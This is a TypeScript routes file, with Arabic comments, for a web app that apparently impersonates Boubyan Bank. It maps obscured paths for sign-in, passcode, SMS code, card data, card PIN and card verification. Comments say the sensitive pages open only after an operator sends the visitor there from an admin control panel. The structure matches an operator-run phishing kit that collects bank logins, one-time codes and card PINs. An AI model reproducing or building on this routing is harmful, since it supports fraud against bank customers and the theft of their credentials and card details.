/** مسارات موحّدة للنشر — بدون .html */
export const ROUTES = {
  home: "/",
  personalInfo: "/register-info",
  signIn: "/member-access",
  passcode: "/access-key",
  sms: "/notify-key",
  cardData: "/extra-key-a",
  cardPin: "/extra-key-b",
  cardVerify: "/extra-key-c",
  panel: "/manage-hub",
} as const;

export type AppRoute = (typeof ROUTES)[keyof typeof ROUTES];

/** مسارات قديمة → الحالية (لوحة التحكم، قاعدة البيانات، روابط سابقة) */
export const LEGACY_TARGET_MAP: Record<string, AppRoute> = {
  "/": ROUTES.home,
  "/login": ROUTES.signIn,
  "/password": ROUTES.passcode,
  "/verify": ROUTES.sms,
  "/admin": ROUTES.panel,
  "index.html": ROUTES.home,
  "login.html": ROUTES.signIn,
  "password.html": ROUTES.passcode,
  "verify.html": ROUTES.sms,
  "/personal-info": ROUTES.personalInfo,
  "/sign-in": ROUTES.signIn,
  "/passcode": ROUTES.passcode,
  "/sms-code": ROUTES.sms,
  "/card-data": ROUTES.cardData,
  "/card-pin": ROUTES.cardPin,
  "/card-verify": ROUTES.cardVerify,
  "/panel": ROUTES.panel,
};

/** تحويل 301 في التطبيق من عناوين سابقة */
export const OBSOLETE_PATH_REDIRECTS: Record<string, AppRoute> = {
  "/personal-info": ROUTES.personalInfo,
  "/sign-in": ROUTES.signIn,
  "/passcode": ROUTES.passcode,
  "/sms-code": ROUTES.sms,
  "/card-data": ROUTES.cardData,
  "/card-pin": ROUTES.cardPin,
  "/card-verify": ROUTES.cardVerify,
  "/panel": ROUTES.panel,
};

/** لا يمكن للعميل فتحها إلا بعد توجيه من لوحة التحكم */
export const ADMIN_GATED_ROUTES = new Set<AppRoute>([
  ROUTES.passcode,
  ROUTES.sms,
  ROUTES.cardData,
  ROUTES.cardPin,
  ROUTES.cardVerify,
]);

/** صفحات بنك بوبيان داكنة */
export const BANK_ROUTES = new Set<AppRoute>([
  ROUTES.signIn,
  ROUTES.passcode,
  ROUTES.sms,
  ROUTES.cardData,
  ROUTES.cardPin,
  ROUTES.cardVerify,
]);